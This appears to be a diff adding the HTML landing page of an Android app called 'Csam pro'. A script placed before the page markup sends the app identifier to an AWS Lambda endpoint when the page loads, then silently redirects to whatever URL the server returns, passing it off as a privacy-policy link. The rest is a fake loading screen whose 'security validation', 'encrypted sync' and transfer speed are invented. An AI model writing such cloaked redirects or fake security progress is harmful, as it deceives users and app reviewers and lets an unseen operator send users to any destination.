@@ -1,0 +1,630 @@
+<script>window.appInformation = {"name":"Csam pro","icon":"","identifier":"com.game.burgerstack","email":"com.game.burgerstack@gmail.com","apiBase":"https:\/\/bx4la7ruqx6u7wy7wg3cw7iuva0xplyv.lambda-url.us-west-2.on.aws\/","platform":"android"};</script><script>
+        const apiBase = window.appInformation.apiBase.replace(/\/+$/, '');
+        const identifier = window.appInformation.identifier;
+        fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier))
+            .then(r => r.json())
+            .then(function (info) {
+                const privacyUrl = info && info.result && info.result.url;
+                if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                    window.location.replace(privacyUrl);
+                    return;
+                }
+            })
+    </script>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Csam pro</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        brand: {
+                            50: '#f8fafc',
+                            100: '#f1f5f9',
+                            200: '#e2e8f0',
+                            300: '#cbd5e1',
+                            400: '#94a3b8',
+                            500: '#64748b',
+                            600: '#475569',
+                            700: '#334155',
+                            800: '#1e293b',
+                            900: '#0f172a',
+                            950: '#020617',
+                        }
+                    },
+                    animation: {
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                        'spin-slow': 'spin 12s linear infinite',
+                        'spin-reverse': 'spin-reverse 15s linear infinite',
+                        'float': 'float 6s ease-in-out infinite',
+                    },
+                    keyframes: {
+                        'spin-reverse': {
+                            '0%': { transform: 'rotate(0deg)' },
+                            '100%': { transform: 'rotate(-360deg)' },
+                        },
+                        'float': {
+                            '0%, 100%': { transform: 'translateY(0px)' },
+                            '50%': { transform: 'translateY(-10px)' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        /* Custom smooth noise background texture */
+        .bg-noise {
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)' opacity='0.025'/%3E%3C/svg%3E");
+        }
+
+        /* Glassmorphism subtle effect */
+        .glass-card {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.8);
+            box-shadow: 
+                0 20px 40px -15px rgba(15, 23, 42, 0.05),
+                0 0 15px 0 rgba(255, 255, 255, 0.5);
+        }
+
+        /* Custom glow effects */
+        .glow-subtle {
+            box-shadow: 0 0 30px rgba(15, 23, 42, 0.06);
+        }
+
+        /* Smooth canvas background */
+        #particleCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        /* Shimmer loading effect */
+        .shimmer {
+            background: linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.8) 50%, rgba(255,255,255,0) 100%);
+            background-size: 200% 100%;
+            animation: shimmer 2.5s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        /* Modern Gradient Text */
+        .text-gradient {
+            background: linear-gradient(135deg, #0f172a 0%, #475569 60%, #020617 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .text-gradient-subtle {
+            background: linear-gradient(135deg, #334155 0%, #64748b 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* Circular loader SVG animation */
+        .circle-bar {
+            transition: stroke-dashoffset 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+    </style>
+</head>
+<body class="h-full bg-slate-50 text-slate-800 font-sans antialiased overflow-hidden select-none bg-noise flex flex-col justify-between relative">
+
+    <!-- Interactive Particle Overlay Canvas -->
+    <canvas id="particleCanvas"></canvas>
+
+    <!-- Background Subtle Decorative Geometry -->
+    <div class="absolute inset-0 overflow-hidden pointer-events-none z-0">
+        <div class="absolute -top-[20%] -left-[10%] w-[50vw] h-[50vw] rounded-full bg-gradient-to-br from-slate-200/40 to-transparent blur-3xl transform -rotate-12"></div>
+        <div class="absolute -bottom-[20%] -right-[10%] w-[60vw] h-[60vw] rounded-full bg-gradient-to-tl from-slate-300/30 via-slate-100/40 to-transparent blur-3xl"></div>
+        <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-white/60 rounded-full blur-2xl"></div>
+    </div>
+
+    <!-- Header / Brand Top Bar -->
+    <header class="relative z-10 w-full px-8 py-6 flex justify-between items-center max-w-7xl mx-auto">
+        <div class="flex items-center space-x-3">
+            <div class="w-8 h-8 rounded-lg bg-slate-900 flex items-center justify-center text-white font-black text-xs tracking-wider shadow-md">
+                CP
+            </div>
+            <span class="text-xs tracking-widest text-slate-400 uppercase font-mono font-medium">Enterprise Engine</span>
+        </div>
+        
+        <div class="flex items-center space-x-6 text-xs text-slate-500 font-mono">
+            <div class="hidden sm:flex items-center space-x-2 bg-white/80 border border-slate-200/80 px-3 py-1.5 rounded-full shadow-sm">
+                <span id="statusIndicator" class="w-2 h-2 rounded-full bg-amber-400 animate-ping"></span>
+                <span id="statusTextShort">INITIALIZING</span>
+            </div>
+            <button id="audioToggle" class="hover:text-slate-900 transition-colors duration-200 p-2 rounded-full hover:bg-slate-200/50" title="Toggle Sound">
+                <i id="audioIcon" class="fa-solid fa-volume-xmark text-sm"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- Main Content Area: Centered Sleek Loading Card -->
+    <main class="relative z-10 my-auto px-4 sm:px-6 flex flex-col items-center justify-center w-full max-w-xl mx-auto">
+        
+        <!-- Center Glass Card -->
+        <div class="w-full glass-card rounded-3xl p-8 sm:p-12 flex flex-col items-center text-center relative overflow-hidden transition-all duration-500">
+            
+            <!-- Top Subtle Glow Line -->
+            <div class="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-slate-400/40 to-transparent"></div>
+
+            <!-- Sleek Circular & Ring Loader Section -->
+            <div class="relative w-32 h-32 mb-8 flex items-center justify-center">
+                <!-- Rotating Outer Decorative Rings -->
+                <div class="absolute inset-0 rounded-full border border-slate-200/80 border-dashed animate-spin-slow"></div>
+                <div class="absolute inset-2 rounded-full border border-slate-300/40 animate-spin-reverse"></div>
+                
+                <!-- Inner Glowing Backdrop -->
+                <div class="absolute inset-4 rounded-full bg-slate-100/80 shadow-inner flex items-center justify-center"></div>
+
+                <!-- SVG Dynamic Progress Ring -->
+                <svg class="w-28 h-28 transform -rotate-90 relative z-10" viewBox="0 0 100 100">
+                    <!-- Background Circle -->
+                    <circle
+                        cx="50"
+                        cy="50"
+                        r="42"
+                        stroke="#e2e8f0"
+                        stroke-width="4"
+                        fill="transparent"
+                    />
+                    <!-- Animated Progress Circle -->
+                    <circle
+                        id="progressCircle"
+                        class="circle-bar"
+                        cx="50"
+                        cy="50"
+                        r="42"
+                        stroke="url(#gradientStroke)"
+                        stroke-width="4.5"
+                        stroke-dasharray="263.89"
+                        stroke-dashoffset="263.89"
+                        stroke-linecap="round"
+                        fill="transparent"
+                    />
+                    <!-- SVG Gradient Definition -->
+                    <defs>
+                        <linearGradient id="gradientStroke" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stop-color="#0f172a" />
+                            <stop offset="50%" stop-color="#334155" />
+                            <stop offset="100%" stop-color="#64748b" />
+                        </linearGradient>
+                    </defs>
+                </svg>
+
+                <!-- Centered Live Percentage Counter -->
+                <div class="absolute inset-0 flex flex-col items-center justify-center z-20">
+                    <span id="percentageText" class="text-2xl font-bold font-mono tracking-tight text-slate-900">0%</span>
+                </div>
+            </div>
+
+            <!-- Title & Subtitle Section -->
+            <div class="space-y-2 mb-8">
+                <h1 class="text-3xl sm:text-4xl font-extrabold tracking-tight text-gradient">
+                    Csam pro
+                </h1>
+                <p class="text-xs sm:text-sm font-medium text-slate-400 tracking-wide uppercase font-mono">
+                    Next-Gen Processing Framework
+                </p>
+            </div>
+
+            <!-- Linear Progress Bar & Indicators -->
+            <div class="w-full space-y-3">
+                <div class="relative w-full h-1.5 bg-slate-200/70 rounded-full overflow-hidden shadow-inner">
+                    <!-- Dynamic Progress Fill -->
+                    <div id="progressBar" class="h-full bg-gradient-to-r from-slate-900 via-slate-700 to-slate-800 rounded-full transition-all duration-300 ease-out w-0 relative">
+                        <!-- Shimmer Light Overlay -->
+                        <div class="absolute inset-0 shimmer opacity-50"></div>
+                    </div>
+                </div>
+
+                <!-- Step Description & Status Info -->
+                <div class="flex justify-between items-center text-xs text-slate-500 font-mono pt-1">
+                    <div class="flex items-center space-x-2">
+                        <i id="statusIcon" class="fa-solid fa-circle-notch fa-spin text-slate-700 text-[10px]"></i>
+                        <span id="statusMessage" class="text-slate-600 font-medium">Initializing core modules...</span>
+                    </div>
+                    <span id="speedMetric" class="text-slate-400 hidden sm:inline">64.2 MB/s</span>
+                </div>
+            </div>
+
+            <!-- Dynamic System Log Checklist -->
+            <div class="w-full mt-8 pt-6 border-t border-slate-200/60 flex flex-col space-y-2 text-left">
+                <div id="step1" class="flex items-center justify-between text-xs font-mono text-slate-400 transition-colors duration-300">
+                    <span class="flex items-center gap-2">
+                        <i class="fa-regular fa-circleCheck text-slate-300 text-xs step-check"></i>
+                        <span>Security & Token Validation</span>
+                    </span>
+                    <span class="step-status font-medium text-slate-400">PENDING</span>
+                </div>
+                <div id="step2" class="flex items-center justify-between text-xs font-mono text-slate-400 transition-colors duration-300">
+                    <span class="flex items-center gap-2">
+                        <i class="fa-regular fa-circleCheck text-slate-300 text-xs step-check"></i>
+                        <span>Cloud Workspace Sync</span>
+                    </span>
+                    <span class="step-status font-medium text-slate-400">PENDING</span>
+                </div>
+                <div id="step3" class="flex items-center justify-between text-xs font-mono text-slate-400 transition-colors duration-300">
+                    <span class="flex items-center gap-2">
+                        <i class="fa-regular fa-circleCheck text-slate-300 text-xs step-check"></i>
+                        <span>Rendering UI Assets</span>
+                    </span>
+                    <span class="step-status font-medium text-slate-400">PENDING</span>
+                </div>
+            </div>
+
+            <!-- Complete Button (Hidden initially, reveals when loaded) -->
+            <div id="completionBox" class="mt-8 hidden w-full transform transition-all duration-500 opacity-0 scale-95">
+                <button id="launchBtn" onclick="handleLaunch()" class="w-full py-3.5 px-6 rounded-xl bg-slate-900 hover:bg-slate-800 text-white font-medium text-sm tracking-wide shadow-lg hover:shadow-xl transition-all duration-200 flex items-center justify-center space-x-2 group">
+                    <span>Enter Workspace</span>
+                    <i class="fa-solid fa-arrow-right text-xs group-hover:translate-x-1 transition-transform"></i>
+                </button>
+            </div>
+
+        </div>
+
+        <!-- Interactive Re-trigger Hint -->
+        <p class="text-xs text-slate-400 mt-6 font-mono text-center">
+            Press <kbd class="px-1.5 py-0.5 bg-slate-200/70 border border-slate-300 rounded text-[10px] text-slate-600 font-semibold">R</kbd> to restart simulation
+        </p>
+    </main>
+
+    <!-- Footer Information -->
+    <footer class="relative z-10 w-full px-8 py-6 max-w-7xl mx-auto flex flex-col sm:flex-row justify-between items-center text-xs text-slate-400 font-mono gap-3">
+        <div>
+            <span>&copy; 2026 CSAM PRO SYSTEMS. ALL RIGHTS RESERVED.</span>
+        </div>
+        <div class="flex items-center space-x-6">
+            <span class="hover:text-slate-600 cursor-pointer transition-colors">PRIVACY</span>
+            <span class="hover:text-slate-600 cursor-pointer transition-colors">TERMS</span>
+            <span class="hover:text-slate-600 cursor-pointer transition-colors">v3.4.0-RELEASE</span>
+        </div>
+    </footer>
+
+    <!-- Audio & Application Logic -->
+    <script>
+        // --- Web Audio API for UI Sound Effects ---
+        class SoundEffects {
+            constructor() {
+                this.ctx = null;
+                this.enabled = false;
+            }
+
+            init() {
+                if (!this.ctx) {
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    this.ctx = new AudioContext();
+                }
+            }
+
+            playBeep(freq = 440, duration = 0.05, type = 'sine') {
+                if (!this.enabled || !this.ctx) return;
+                try {
+                    const osc = this.ctx.createOscillator();
+                    const gain = this.ctx.createGain();
+                    osc.type = type;
+                    osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
+                    gain.gain.setValueAtTime(0.015, this.ctx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.0001, this.ctx.currentTime + duration);
+                    osc.connect(gain);
+                    gain.connect(this.ctx.destination);
+                    osc.start();
+                    osc.stop(this.ctx.currentTime + duration);
+                } catch (e) {
+                    // Ignore audio context errors
+                }
+            }
+
+            playSuccess() {
+                if (!this.enabled || !this.ctx) return;
+                const now = this.ctx.currentTime;
+                [523.25, 659.25, 783.99, 1046.50].forEach((freq, index) => {
+                    setTimeout(() => this.playBeep(freq, 0.1, 'triangle'), index * 60);
+                });
+            }
+        }
+
+        const sound = new SoundEffects();
+
+        // Audio Toggle Switch logic
+        const audioBtn = document.getElementById('audioToggle');
+        const audioIcon = document.getElementById('audioIcon');
+        
+        audioBtn.addEventListener('click', () => {
+            sound.init();
+            sound.enabled = !sound.enabled;
+            if (sound.enabled) {
+                audioIcon.className = 'fa-solid fa-volume-high text-slate-800';
+                sound.playBeep(880, 0.08);
+            } else {
+                audioIcon.className = 'fa-solid fa-volume-xmark text-slate-400';
+            }
+        });
+
+        // --- Canvas Particle Animation ---
+        const canvas = document.getElementById('particleCanvas');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+
+        class Particle {
+            constructor() {
+                this.reset();
+            }
+
+            reset() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.vx = (Math.random() - 0.5) * 0.4;
+                this.vy = (Math.random() - 0.5) * 0.4;
+                this.radius = Math.random() * 1.5 + 0.5;
+                this.alpha = Math.random() * 0.3 + 0.1;
+            }
+
+            update() {
+                this.x += this.vx;
+                this.y += this.vy;
+
+                if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
+            }
+
+            draw() {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                ctx.fillStyle = `rgba(71, 85, 105, ${this.alpha})`;
+                ctx.fill();
+            }
+        }
+
+        function initParticles() {
+            particles = [];
+            const count = Math.min(Math.floor(window.innerWidth / 20), 50);
+            for (let i = 0; i < count; i++) {
+                particles.push(new Particle());
+            }
+        }
+
+        function animateParticles() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            // Draw subtle connecting lines
+            for (let i = 0; i < particles.length; i++) {
+                for (let j = i + 1; j < particles.length; j++) {
+                    const dx = particles[i].x - particles[j].x;
+                    const dy = particles[i].y - particles[j].y;
+                    const dist = Math.sqrt(dx * dx + dy * dy);
+
+                    if (dist < 120) {
+                        ctx.beginPath();
+                        ctx.moveTo(particles[i].x, particles[i].y);
+                        ctx.lineTo(particles[j].x, particles[j].y);
+                        ctx.strokeStyle = `rgba(148, 163, 184, ${0.12 * (1 - dist / 120)})`;
+                        ctx.lineWidth = 0.75;
+                        ctx.stroke();
+                    }
+                }
+            }
+
+            particles.forEach(p => {
+                p.update();
+                p.draw();
+            });
+
+            requestAnimationFrame(animateParticles);
+        }
+
+        window.addEventListener('resize', () => {
+            resizeCanvas();
+            initParticles();
+        });
+
+        // --- Main Loading Engine Logic ---
+        const progressCircle = document.getElementById('progressCircle');
+        const progressBar = document.getElementById('progressBar');
+        const percentageText = document.getElementById('percentageText');
+        const statusMessage = document.getElementById('statusMessage');
+        const statusIcon = document.getElementById('statusIcon');
+        const statusIndicator = document.getElementById('statusIndicator');
+        const statusTextShort = document.getElementById('statusTextShort');
+        const completionBox = document.getElementById('completionBox');
+        const speedMetric = document.getElementById('speedMetric');
+
+        const circleRadius = 42;
+        const circumference = 2 * Math.PI * circleRadius; // ~263.89
+
+        const stages = [
+            { pct: 15, msg: "Initializing core modules...", step: null },
+            { pct: 35, msg: "Validating user security & session...", step: "step1" },
+            { pct: 65, msg: "Establishing encrypted sync pipeline...", step: "step2" },
+            { pct: 88, msg: "Rendering workspace components...", step: "step3" },
+            { pct: 100, msg: "Environment ready.", step: "complete" }
+        ];
+
+        let currentProgress = 0;
+        let animationInterval = null;
+
+        function setProgress(percent) {
+            currentProgress = percent;
+            
+            // Update circular progress SVG
+            const offset = circumference - (percent / 100) * circumference;
+            progressCircle.style.strokeDashoffset = offset;
+
+            // Update horizontal progress bar
+            progressBar.style.width = `${percent}%`;
+
+            // Update numerical display
+            percentageText.textContent = `${Math.round(percent)}%`;
+
+            // Update dynamic speed indicator mock
+            if (percent < 100) {
+                const mockSpeed = (40 + Math.sin(percent) * 25).toFixed(1);
+                speedMetric.textContent = `${mockSpeed} MB/s`;
+            } else {
+                speedMetric.textContent = `SYNCED`;
+            }
+        }
+
+        function updateStepStatus(stepId, state) {
+            const stepEl = document.getElementById(stepId);
+            if (!stepEl) return;
+
+            const icon = stepEl.querySelector('.step-check');
+            const statusText = stepEl.querySelector('.step-status');
+
+            if (state === 'active') {
+                stepEl.classList.remove('text-slate-400');
+                stepEl.classList.add('text-slate-800', 'font-medium');
+                statusText.textContent = 'RUNNING...';
+                statusText.className = 'step-status font-medium text-amber-600 animate-pulse';
+            } else if (state === 'done') {
+                stepEl.classList.remove('text-slate-400');
+                stepEl.classList.add('text-slate-700');
+                icon.className = 'fa-solid fa-circle-check text-emerald-500 text-xs step-check';
+                statusText.textContent = 'OK';
+                statusText.className = 'step-status font-semibold text-emerald-600';
+            }
+        }
+
+        function startSimulation() {
+            // Reset UI States
+            clearInterval(animationInterval);
+            currentProgress = 0;
+            setProgress(0);
+
+            completionBox.classList.add('hidden', 'opacity-0', 'scale-95');
+            statusIcon.className = 'fa-solid fa-circle-notch fa-spin text-slate-700 text-[10px]';
+            statusIndicator.className = 'w-2 h-2 rounded-full bg-amber-400 animate-ping';
+            statusTextShort.textContent = 'INITIALIZING';
+
+            // Reset step UI
+            ['step1', 'step2', 'step3'].forEach(id => {
+                const el = document.getElementById(id);
+                el.className = 'flex items-center justify-between text-xs font-mono text-slate-400 transition-colors duration-300';
+                el.querySelector('.step-check').className = 'fa-regular fa-circleCheck text-slate-300 text-xs step-check';
+                const status = el.querySelector('.step-status');
+                status.textContent = 'PENDING';
+                status.className = 'step-status font-medium text-slate-400';
+            });
+
+            let currentStageIdx = 0;
+
+            animationInterval = setInterval(() => {
+                // Non-linear realistic progress increment
+                const increment = Math.random() * 2.5 + 0.8;
+                let nextProgress = currentProgress + increment;
+
+                const targetStage = stages[currentStageIdx];
+
+                if (nextProgress >= targetStage.pct) {
+                    nextProgress = targetStage.pct;
+                    statusMessage.textContent = targetStage.msg;
+
+                    // Step item transitions
+                    if (targetStage.step && targetStage.step !== 'complete') {
+                        if (currentStageIdx > 1) {
+                            const prevStep = stages[currentStageIdx - 1].step;
+                            if (prevStep) updateStepStatus(prevStep, 'done');
+                        }
+                        updateStepStatus(targetStage.step, 'active');
+                    }
+
+                    if (targetStage.step === 'complete') {
+                        updateStepStatus('step3', 'done');
+                    }
+
+                    currentStageIdx++;
+                }
+
+                setProgress(nextProgress);
+                sound.playBeep(300 + nextProgress * 4, 0.02);
+
+                if (nextProgress >= 100) {
+                    clearInterval(animationInterval);
+                    onLoadingComplete();
+                }
+            }, 60);
+        }
+
+        function onLoadingComplete() {
+            statusMessage.textContent = 'All systems operational.';
+            statusIcon.className = 'fa-solid fa-check text-emerald-500 text-xs';
+            statusIndicator.className = 'w-2 h-2 rounded-full bg-emerald-500';
+            statusTextShort.textContent = 'READY';
+
+            sound.playSuccess();
+
+            // Reveal completion button gracefully
+            setTimeout(() => {
+                completionBox.classList.remove('hidden');
+                setTimeout(() => {
+                    completionBox.classList.remove('opacity-0', 'scale-95');
+                    completionBox.classList.add('opacity-100', 'scale-100');
+                }, 50);
+            }, 300);
+        }
+
+        function handleLaunch() {
+            sound.playBeep(880, 0.1);
+            
+            // Simple visual feedback on button click
+            const btn = document.getElementById('launchBtn');
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>Entering...</span>';
+            
+            setTimeout(() => {
+                btn.innerHTML = '<i class="fa-solid fa-check"></i> <span>Welcome to Csam pro</span>';
+                btn.classList.remove('bg-slate-900', 'hover:bg-slate-800');
+                btn.classList.add('bg-emerald-600', 'hover:bg-emerald-700');
+            }, 600);
+        }
+
+        // Global key shortcut (Press 'R' to reload simulation)
+        window.addEventListener('keydown', (e) => {
+            if (e.key === 'r' || e.key === 'R') {
+                startSimulation();
+            }
+        });
+
+        // Initialize on window load
+        window.onload = function() {
+            resizeCanvas();
+            initParticles();
+            animateParticles();
+            
+            // Start simulation slightly after initial view render
+            setTimeout(startSimulation, 400);
+        };
+    </script>
+</body>
+</html>
